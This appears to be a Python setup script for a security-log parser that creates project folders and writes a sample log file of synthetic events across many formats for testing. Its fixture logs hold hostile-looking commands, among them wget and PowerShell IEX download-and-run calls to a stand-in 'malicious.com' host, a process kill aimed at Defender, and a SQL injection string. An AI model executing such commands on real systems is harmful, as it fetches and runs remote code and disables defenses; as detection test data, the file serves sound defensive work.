@@ -1,0 +1,182 @@
+from pathlib import Path
+from typing import List
+
+
+def ensure_directories(base_path: str = ".") -> None:
+    """
+    Ensure all required directories exist.
+
+    Args:
+        base_path: Base path for the project
+    """
+    directories = [
+        "config",
+        "decoders",
+        "context",
+        "data/input",
+        "data/output",
+        "data/samples",
+        "rules",
+        "server",
+        "utils"
+    ]
+
+    base = Path(base_path)
+    for directory in directories:
+        dir_path = base / directory
+        dir_path.mkdir(parents=True, exist_ok=True)
+        print(f"✓ Created directory: {dir_path}")
+
+
+def create_sample_logs(output_path: str = "data/samples/sample_logs.txt") -> None:
+    """
+    Create sample log file with various log formats for testing.
+
+    Args:
+        output_path: Path where sample logs will be created
+    """
+    sample_logs = """# Sample Security Agent Logs for Testing
+# This file contains examples of all supported log formats
+
+# ============================================================================
+# BASIC SECURITY EVENTS
+# ============================================================================
+
+FIM [2025-11-04 10:23:15] modified: /etc/passwd
+FIM [2025-11-04 10:23:16] created: C:\\Windows\\System32\\malware.dll
+FIM [2025-11-04 10:23:17] deleted: /usr/bin/important_binary
+
+PROC [2025-11-04 10:24:00] PID:1234 User:admin Cmd:powershell -enc SGVsbG8gV29ybGQ=
+PROC [2025-11-04 10:24:01] PID:5678 User:john Cmd:bash -c "wget http://malicious.com/payload.sh"
+PROC [2025-11-04 10:24:02] PID:9012 User:system Cmd:cmd.exe /c whoami
+
+NET [2025-11-04 10:25:00] TCP 192.168.1.100:54321 -> 8.8.8.8:443
+NET [2025-11-04 10:25:01] UDP 10.0.0.50:49152 -> 1.1.1.1:53
+NET [2025-11-04 10:25:02] TCP 192.168.1.100:49153 -> 45.33.32.156:4444
+
+AUTH [2025-11-04 10:26:00] failed User:admin From:192.168.1.200
+AUTH [2025-11-04 10:26:01] success User:john From:192.168.1.150
+AUTH [2025-11-04 10:26:02] failed User:root From:203.0.113.45
+
+REG [2025-11-04 10:27:00] modified: Key:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Value:Malware.exe
+REG [2025-11-04 10:27:01] created: Key:HKCU\\Software\\Policies\\Microsoft\\Windows\\System Value:DisableFirewall
+REG [2025-11-04 10:27:02] deleted: Key:HKLM\\System\\CurrentControlSet\\Services\\WinDefend Value:Start
+
+SVC [2025-11-04 10:28:00] stopped: Service:WindowsDefender Status:inactive
+SVC [2025-11-04 10:28:01] started: Service:RemoteAccess Status:running
+SVC [2025-11-04 10:28:02] modified: Service:WindowsFirewall Status:disabled
+
+# ============================================================================
+# WINDOWS DEFENDER LOGS
+# ============================================================================
+
+Event ID: 1116 TimeCreated: 2025-11-04T10:30:00 Provider: Microsoft-Windows-Windows Defender ThreatName: Trojan:Win32/Meterpreter Severity: High Action: Quarantined Path: C:\\Windows\\Temp\\malware.exe
+Event ID: 1117 TimeCreated: 2025-11-04T10:30:01 Provider: Microsoft-Windows-Windows Defender ThreatName: Trojan:Win32/Meterpreter Action: Removed ResourcePath: C:\\Windows\\Temp\\malware.exe
+Event ID: 1118 TimeCreated: 2025-11-04T10:30:30 Provider: Microsoft-Windows-Windows Defender Message: Full scan started
+Event ID: 2000 TimeCreated: 2025-11-04T10:31:00 Provider: Microsoft-Windows-Windows Defender Message: Signature updated successfully Version: 1.381.123.0
+Event ID: 5001 TimeCreated: 2025-11-04T10:32:00 Provider: Microsoft-Windows-Windows Defender Message: Real-time protection was disabled
+
+# ============================================================================
+# WINDOWS SECURITY LOGS (Authentication & Privilege)
+# ============================================================================
+
+Event ID: 4625 TimeCreated: 2025-11-04T10:35:00 LogonType: 3 TargetUserName: Administrator IpAddress: 192.168.1.200 LogonProcess: NtLmSsp AuthenticationPackageName: NTLM FailureReason: Unknown user name or bad password
+Event ID: 4625 TimeCreated: 2025-11-04T10:35:01 LogonType: 3 TargetUserName: Administrator IpAddress: 192.168.1.200 LogonProcess: NtLmSsp AuthenticationPackageName: NTLM
+Event ID: 4625 TimeCreated: 2025-11-04T10:35:02 LogonType: 3 TargetUserName: Administrator IpAddress: 192.168.1.200 LogonProcess: NtLmSsp AuthenticationPackageName: NTLM
+Event ID: 4624 TimeCreated: 2025-11-04T10:36:00 LogonType: 10 TargetUserName: john.doe IpAddress: 192.168.1.150 LogonProcess: User32 AuthenticationPackageName: Negotiate
+Event ID: 4672 TimeCreated: 2025-11-04T10:36:30 SubjectUserName: SYSTEM PrivilegeList: SeDebugPrivilege SeLoadDriverPrivilege
+Event ID: 4720 TimeCreated: 2025-11-04T10:37:00 TargetUserName: backdoor_user SubjectUserName: Administrator
+
+# ============================================================================
+# WINDOWS FIREWALL LOGS
+# ============================================================================
+
+Event ID: 5157 TimeCreated: 2025-11-04T10:40:00 Application: \\device\\harddiskvolume2\\windows\\system32\\suspicious.exe SourceAddress: 192.168.1.100 SourcePort: 54321 DestAddress: 45.33.32.156 DestPort: 4444 Protocol: 6 Direction: Outbound
+Event ID: 5152 TimeCreated: 2025-11-04T10:40:30 SourceAddress: 10.0.0.100 DestAddress: 8.8.8.8 DestPort: 53 Protocol: 17
+Event ID: 5156 TimeCreated: 2025-11-04T10:41:00 Application: C:\\Program Files\\Browser\\browser.exe SourceAddress: 192.168.1.100 DestAddress: 93.184.216.34 DestPort: 443 Protocol: 6
+
+# ============================================================================
+# APPLOCKER LOGS
+# ============================================================================
+
+Event ID: 8004 TimeCreated: 2025-11-04T10:45:00 User: DOMAIN\\user FullFilePath: C:\\Users\\user\\Downloads\\suspicious.exe FileHash: SHA256:A1B2C3D4E5F6 RuleName: DefaultRule
+Event ID: 8007 TimeCreated: 2025-11-04T10:45:30 User: DOMAIN\\user FullFilePath: C:\\Users\\user\\Documents\\malicious.ps1 RuleName: ScriptRule
+Event ID: 8003 TimeCreated: 2025-11-04T10:46:00 User: DOMAIN\\admin FullFilePath: C:\\Windows\\System32\\cmd.exe RuleName: AllowedExecutables
+
+# ============================================================================
+# POWERSHELL LOGS
+# ============================================================================
+
+Event ID: 4104 TimeCreated: 2025-11-04T10:50:00 ScriptBlockText: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ScriptBlockId: 12345-67890 Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+Event ID: 4104 TimeCreated: 2025-11-04T10:50:30 ScriptBlockText: Get-Process | Where-Object {$_.Name -eq 'defender'} | Stop-Process -Force ScriptBlockId: 12345-67891 Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+Event ID: 4103 TimeCreated: 2025-11-04T10:51:00 Payload: IEX (New-Object Net.WebClient).DownloadString CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile
+Event ID: 4105 TimeCreated: 2025-11-04T10:51:30 CommandLine: powershell.exe -enc SGVsbG8gV29ybGQ=
+
+# ============================================================================
+# SYSMON LOGS - Process Creation
+# ============================================================================
+
+Event ID: 1 TimeCreated: 2025-11-04T11:00:00 Image: C:\\Windows\\System32\\cmd.exe CommandLine: cmd.exe /c whoami ParentImage: C:\\Windows\\explorer.exe ParentCommandLine: C:\\Windows\\Explorer.EXE User: DOMAIN\\user ProcessId: 5678 ParentProcessId: 1234 Hashes: SHA256=ABC123DEF456
+Event ID: 1 TimeCreated: 2025-11-04T11:00:30 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX ParentImage: C:\\Windows\\System32\\cmd.exe User: DOMAIN\\user ProcessId: 9012 ParentProcessId: 5678 Hashes: SHA256=DEF456GHI789
+Event ID: 1 TimeCreated: 2025-11-04T11:01:00 Image: C:\\Users\\user\\AppData\\Local\\Temp\\malware.exe CommandLine: malware.exe --install ParentImage: C:\\Windows\\System32\\svchost.exe User: SYSTEM ProcessId: 3456 ParentProcessId: 888
+
+# ============================================================================
+# SYSMON LOGS - Network Connection
+# ============================================================================
+
+Event ID: 3 TimeCreated: 2025-11-04T11:05:00 Image: C:\\Program Files\\Browser\\browser.exe SourceIp: 192.168.1.100 SourcePort: 49152 DestinationIp: 93.184.216.34 DestinationPort: 443 Protocol: tcp User: DOMAIN\\user
+Event ID: 3 TimeCreated: 2025-11-04T11:05:30 Image: C:\\Windows\\System32\\svchost.exe SourceIp: 192.168.1.100 SourcePort: 49153 DestinationIp: 1.1.1.1 DestinationPort: 53 Protocol: udp User: NETWORK SERVICE
+Event ID: 3 TimeCreated: 2025-11-04T11:06:00 Image: C:\\Users\\user\\AppData\\Local\\Temp\\malware.exe SourceIp: 192.168.1.100 SourcePort: 49154 DestinationIp: 45.33.32.156 DestinationPort: 4444 Protocol: tcp User: DOMAIN\\user
+
+# ============================================================================
+# SYSMON LOGS - DNS Query
+# ============================================================================
+
+Event ID: 22 TimeCreated: 2025-11-04T11:10:00 Image: C:\\Windows\\System32\\svchost.exe QueryName: malicious-domain.com QueryResults: 45.33.32.156 User: NETWORK SERVICE
+Event ID: 22 TimeCreated: 2025-11-04T11:10:30 Image: C:\\Program Files\\Browser\\browser.exe QueryName: example.com QueryResults: 93.184.216.34 User: DOMAIN\\user
+
+# ============================================================================
+# GENERIC JSON LOGS
+# ============================================================================
+
+{"timestamp": "2025-11-04T11:15:00", "event_type": "file_access", "user": "administrator", "file_path": "/var/log/secure", "action": "read", "result": "success", "process": "/usr/bin/cat", "pid": 12345, "severity": "low"}
+{"timestamp": "2025-11-04T11:15:30", "event_type": "database_query", "user": "dbadmin", "query": "SELECT * FROM users WHERE id=1", "database": "production", "result": "success", "rows_affected": 1, "severity": "medium"}
+{"timestamp": "2025-11-04T11:16:00", "event_type": "login_attempt", "user": "admin", "source_ip": "203.0.113.45", "result": "failed", "reason": "invalid_password", "severity": "high"}
+
+# ============================================================================
+# GENERIC KEY-VALUE LOGS
+# ============================================================================
+
+timestamp=2025-11-04T11:20:00 severity=warning event=configuration_change component=database user=dbadmin action=alter_table table_name=users changes="added column: password_hash" source_ip=192.168.1.50
+timestamp=2025-11-04T11:20:30 severity=high event=unauthorized_access user=unknown source_ip=203.0.113.45 target_resource=/admin/panel action=blocked reason=ip_blacklist
+timestamp=2025-11-04T11:21:00 severity=info event=backup_completed component=storage user=system backup_size=1024MB duration=300s result=success
+
+# ============================================================================
+# GENERIC XML LOGS
+# ============================================================================
+
+<Event><Timestamp>2025-11-04T11:25:00</Timestamp><Type>security_alert</Type><Source>IDS</Source><Severity>high</Severity><Message>Possible SQL injection detected</Message><SourceIP>203.0.113.45</SourceIP><TargetURL>/api/users?id=1' OR '1'='1</TargetURL></Event>
+<Event><Timestamp>2025-11-04T11:25:30</Timestamp><Type>performance_degradation</Type><Source>Monitor</Source><Severity>medium</Severity><Message>CPU usage above 90%</Message><Host>server-01</Host><CPU>95%</CPU></Event>
+<Event><Timestamp>2025-11-04T11:26:00</Timestamp><Type>file_upload</Type><Source>WebServer</Source><Severity>low</Severity><Message>File uploaded successfully</Message><User>john.doe</User><FileName>document.pdf</FileName><FileSize>2048KB</FileSize></Event>
+
+# ============================================================================
+# UNKNOWN FORMAT LOGS (will be saved to unknown_logs.txt)
+# ============================================================================
+
+[CUSTOM_SYSTEM] %%% Unrecognized format ### 2025-11-04 11:30:00 ### Event occurred
+Some random unstructured log entry without clear format or pattern
+!@#$%^&*() This is definitely not a standard log format 12345 ABCDEF
+"""
+
+    output_file = Path(output_path)
+    output_file.parent.mkdir(parents=True, exist_ok=True)
+
+    with open(output_file, 'w', encoding='utf-8') as f:
+        f.write(sample_logs)
+
+    print(f"✓ Sample logs created at: {output_path}")
+
+
+if __name__ == "__main__":
+    ensure_directories()
+    create_sample_logs()
